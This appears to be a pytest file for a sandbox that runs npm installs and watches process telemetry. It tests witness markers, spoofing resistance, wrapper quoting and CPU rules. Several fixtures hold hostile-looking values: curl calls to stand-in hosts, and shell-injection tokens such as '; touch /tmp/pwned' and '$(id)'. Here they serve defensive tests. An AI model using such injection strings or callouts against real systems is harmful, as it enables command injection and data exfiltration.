import json
import shutil
import subprocess
from pathlib import Path

import pytest

from brain.rules import _cpu_hits
from brain.verdict import unverified_reason
from chamber import detonate
from chamber.resources import CgroupSampler, find_cgroup, parse_cpu_usage_usec
from chamber.telemetry import parse_events, witness_command
from shared.contract import DetonateRequest, DetonateResult, ResourceUsage, SensorWitness
from tests.conftest import NPM_EXEC

CONTAINER = "abc123def456abc123def456abc123d" + "0" * 33
SHORT = CONTAINER[:31]
NONCE = "0f1e2d3c4b5a6978"
SHIM = {"pid": 900, "binary": "/usr/bin/containerd-shim-runc-v2"}  # outside: no docker field


def exec_line(pid, binary, args, parent, docker=SHORT) -> str:
    proc = {"pid": pid, "binary": binary, "arguments": args, "uid": 10001}
    if docker:
        proc["docker"] = docker
    return json.dumps({"process_exec": {"process": proc, "parent": parent},
                       "time": "2026-11-02T00:00:00Z"})  # fmt: skip


def inside(pid, binary):
    return {"pid": pid, "binary": binary, "docker": SHORT}


WRAPPER_ARGS = " ".join(witness_command(["npm", "install"], NONCE)[1:])


def run_lines(*extra: str) -> list[str]:
    """Wrapper (pid 1000) -> pre marker, npm, post marker, as a real v3 run looks."""
    return [
        exec_line(1000, "/usr/bin/dash", WRAPPER_ARGS, SHIM),
        exec_line(1001, "/usr/bin/true", f"pre-{NONCE}", inside(1000, "/usr/bin/dash")),
        exec_line(1002, "/usr/local/bin/npm", "install", inside(1000, "/usr/bin/dash")),
        *extra,
        exec_line(1099, "/usr/bin/true", f"post-{NONCE}", inside(1000, "/usr/bin/dash")),
    ]


# --- parsing the witness ---


def test_both_markers_seen_and_our_processes_are_dropped():
    parsed = parse_events(run_lines(), CONTAINER, NONCE)
    assert parsed.witness_pre and parsed.witness_post
    assert [e.binary for e in parsed.exec_events] == ["/usr/local/bin/npm"]


def test_payload_quoting_the_nonce_is_kept_not_hidden():
    curl = exec_line(1050, "/usr/bin/curl", f"http://203.0.113.10/?pre-{NONCE}",
                     inside(1002, "/usr/local/bin/npm"))  # fmt: skip
    parsed = parse_events(run_lines(curl), CONTAINER, NONCE)
    assert "/usr/bin/curl" in [e.binary for e in parsed.exec_events]


def test_marker_faked_from_inside_the_sandbox_does_not_count():
    lines = run_lines()[:-1]  # the real post marker never arrives
    fake = exec_line(1060, "/usr/bin/true", f"post-{NONCE}", inside(1002, "/usr/local/bin/npm"))
    parsed = parse_events([*lines, fake], CONTAINER, NONCE)
    assert parsed.witness_pre and not parsed.witness_post
    assert "/usr/bin/true" in [e.binary for e in parsed.exec_events]  # kept as evidence


def test_wrapper_lookalike_started_inside_the_sandbox_is_kept():
    fake = exec_line(
        1070, "/bin/sh", WRAPPER_ARGS + "; curl evil", inside(1002, "/usr/local/bin/npm")
    )
    parsed = parse_events(run_lines(fake), CONTAINER, NONCE)
    assert any("curl evil" in e.args for e in parsed.exec_events)


ENTRYPOINT = "/usr/local/bin/docker-entrypoint.sh"


def entrypoint_lines(*extra: str) -> list[str]:
    """The tree a real run produces: the image declares an ENTRYPOINT, so our witness shell is
    a child of that, not of the runtime."""
    return [
        exec_line(999, ENTRYPOINT, f"{ENTRYPOINT} /bin/sh -c ...", SHIM),
        exec_line(1000, "/bin/sh", WRAPPER_ARGS, inside(999, ENTRYPOINT)),
        exec_line(1001, "/bin/true", f"pre-{NONCE}", inside(1000, "/bin/sh")),
        exec_line(1002, "/usr/local/bin/npm", "install", inside(1000, "/bin/sh")),
        *extra,
        exec_line(1099, "/bin/true", f"post-{NONCE}", inside(1000, "/bin/sh")),
    ]


def test_witness_is_recognised_through_the_image_entrypoint():
    """Regression: the sandbox image has an ENTRYPOINT, so the witness shell's parent is
    inside the container. Requiring the parent to be *outside* made every real run report
    pre_seen=False, which fails closed as "Could not verify" on every pull request."""
    parsed = parse_events(entrypoint_lines(), CONTAINER, NONCE)
    assert parsed.witness_pre and parsed.witness_post
    # The entrypoint is real telemetry and stays; our shell and both markers do not.
    assert [e.binary for e in parsed.exec_events] == [ENTRYPOINT, "/usr/local/bin/npm"]


def test_payload_cannot_pose_as_the_wrapper_under_the_entrypoint():
    """The relaxed check still only trusts a container *root's* child. A payload descends from
    npm, so its shell has neither an external nor a root parent, however it quotes the nonce."""
    fake = exec_line(1080, "/bin/sh", WRAPPER_ARGS, inside(1002, "/usr/local/bin/npm"))
    parsed = parse_events(entrypoint_lines(fake), CONTAINER, NONCE)
    assert any(e.pid == 1080 for e in parsed.exec_events)  # kept, not treated as the wrapper
    faked = exec_line(1081, "/bin/true", f"post-{NONCE}", inside(1080, "/bin/sh"))
    only_pre = parse_events([*entrypoint_lines()[:-1], fake, faked], CONTAINER, NONCE)
    assert only_pre.witness_pre and not only_pre.witness_post


def test_markers_from_another_container_are_ignored():
    other = "f" * 31
    lines = [exec_line(1000, "/usr/bin/dash", WRAPPER_ARGS, SHIM, docker=other),
             exec_line(1001, "/usr/bin/true", f"pre-{NONCE}", {"pid": 1000, "docker": other},
                       docker=other)]  # fmt: skip
    parsed = parse_events(lines, CONTAINER, NONCE)
    assert not parsed.witness_pre and parsed.exec_events == []


def test_without_a_nonce_nothing_is_filtered():
    parsed = parse_events(run_lines(), CONTAINER)
    assert len(parsed.exec_events) == 4 and not parsed.witness_pre


# --- the wrapper itself ---


def test_wrapper_uses_true_by_path_and_passes_the_command_through():
    cmd = witness_command(["npm", "install", "--no-audit"], NONCE)
    assert cmd[:2] == ["/bin/sh", "-c"] and cmd[-3:] == ["npm", "install", "--no-audit"]
    assert f"/bin/true pre-{NONCE}" in cmd[2] and f"/bin/true post-{NONCE}" in cmd[2]


@pytest.mark.skipif(not shutil.which("sh"), reason="needs a POSIX sh")
def test_wrapper_exits_with_the_install_status():
    script = witness_command(["sh", "-c", "exit 7"], NONCE)[2]
    rc = subprocess.run([shutil.which("sh"), "-c", script, "w", "sh", "-c", "exit 7"]).returncode
    assert rc == 7


def test_the_command_is_never_interpolated_into_the_wrapper_script():
    """The wrapper runs the install through `/bin/sh -c`, which would be an injection surface
    if the command were formatted into the script text. It is not: the script is a fixed string
    using quoted `"$@"`, and the command arrives as separate argv entries after `$0`.

    Pinned because the safe and unsafe versions look almost identical - switching `"$@"` to
    `$*`, or building the script with an f-string over `command`, would make every token
    shell-evaluated. Only the nonce (hex from `secrets.token_hex`) is ever interpolated."""
    hostile = ["npm", "install", "; touch /tmp/pwned", "$(id)", "`id`", "&& curl evil.test"]
    cmd = witness_command(hostile, NONCE)

    script = cmd[2]
    assert '"$@"' in script, "must expand the command as quoted positional args"
    for token in hostile[2:]:
        assert token not in script, f"{token!r} was interpolated into the shell script"
    assert cmd[3] == "detonator-witness", "$0 must be a placeholder, not part of the command"
    assert cmd[4:] == hostile, "the command must arrive as argv, untouched"


@pytest.mark.skipif(not shutil.which("sh"), reason="needs a POSIX sh")
def test_a_hostile_command_token_is_not_evaluated_by_the_wrapper(tmp_path):
    """The same property, demonstrated by running it: a token that would be a shell command
    if interpolated is passed to `echo` as a literal argument instead."""
    marker = tmp_path / "pwned"
    payload = f"; touch {marker}"
    script = witness_command(["echo", payload], NONCE)[2]

    done = subprocess.run([shutil.which("sh"), "-c", script, "w", "echo", payload],
                          capture_output=True, text=True)  # fmt: skip

    assert not marker.exists(), "the wrapper evaluated a command token as shell"
    assert payload in done.stdout, "the token should reach echo as a literal argument"


def test_docker_args_wrap_the_command_when_given_a_nonce():
    req = DetonateRequest(job_id="j", clone_url="https://github.com/o/r", head_sha="a" * 40)
    args = detonate.docker_run_args(req, detonate.Config(), "det-j", Path("/s"), nonce=NONCE)
    assert f"pre-{NONCE}" in " ".join(args) and args[-2:] == ["--no-audit", "--no-fund"]


# --- verdict ---


def result(sensor=None, resources=None, execs=(NPM_EXEC,)) -> DetonateResult:
    return DetonateResult(job_id="j", status="completed", exit_code=0, duration_s=1,
                          exec_events=list(execs), connect_events=[], dns_queries=[],
                          stdout_tail="", stderr_tail="", sensor=sensor,
                          resources=resources)  # fmt: skip


@pytest.mark.parametrize(
    "sensor, why",
    [
        (None, ""),  # v2 Chamber: the old checks are all we have
        (SensorWitness(pre_seen=True, post_seen=True), ""),
        (SensorWitness(pre_seen=False, post_seen=True), "start marker"),
        (SensorWitness(pre_seen=True, post_seen=False), "end marker"),
    ],
)
def test_witness_gates_clean(sensor, why):
    reason = unverified_reason(result(sensor))
    assert (why in reason and reason) if why else reason == ""


def test_v2_result_without_new_fields_still_validates():
    data = json.loads(result().model_dump_json())
    data.pop("sensor"), data.pop("resources")
    assert DetonateResult.model_validate(data).sensor is None


# --- CPU (rt08) ---


def test_cpu_rule_is_off_until_calibrated():
    assert _cpu_hits(result(resources=ResourceUsage(cpu_s=500))) == []


def test_cpu_rule_fires_low_without_a_build_tool():
    hits = _cpu_hits(result(resources=ResourceUsage(cpu_s=9.0)), threshold=6.0)
    assert [(h.rule_id, h.severity.name) for h in hits] == [("RES_CPU_HEAVY", "LOW")]


def test_cpu_rule_exempts_native_builds():
    gcc = NPM_EXEC.model_copy(update={"binary": "/usr/bin/gcc", "args": "-c x.c"})
    res = result(resources=ResourceUsage(cpu_s=90.0), execs=(NPM_EXEC, gcc))
    assert _cpu_hits(res, threshold=6.0) == []


def test_cpu_stat_parsing():
    assert parse_cpu_usage_usec("usage_usec 8123456\nuser_usec 8000000\nsystem_usec 1\n") == 8123456
    assert parse_cpu_usage_usec("garbage") is None


@pytest.mark.parametrize("layout", ["system.slice/docker-{id}.scope", "docker/{id}"])
def test_sampler_reads_either_cgroup_layout(tmp_path, layout):
    cg = tmp_path / layout.format(id=CONTAINER)
    cg.mkdir(parents=True)
    (cg / "cpu.stat").write_text("usage_usec 2500000\n")
    (cg / "memory.peak").write_text(str(300 * 2**20))
    assert find_cgroup(CONTAINER, str(tmp_path)) == cg
    sampler = CgroupSampler(CONTAINER, root=str(tmp_path))
    assert sampler.sample_once()
    usage = sampler.stop()
    assert usage.cpu_s == 2.5 and usage.peak_memory_mb == 300.0 and usage.samples == 1


def test_sampler_without_a_cgroup_reports_nothing(tmp_path):
    sampler = CgroupSampler(CONTAINER, root=str(tmp_path)).start()
    assert sampler.stop() is None  # no number beats a guessed one
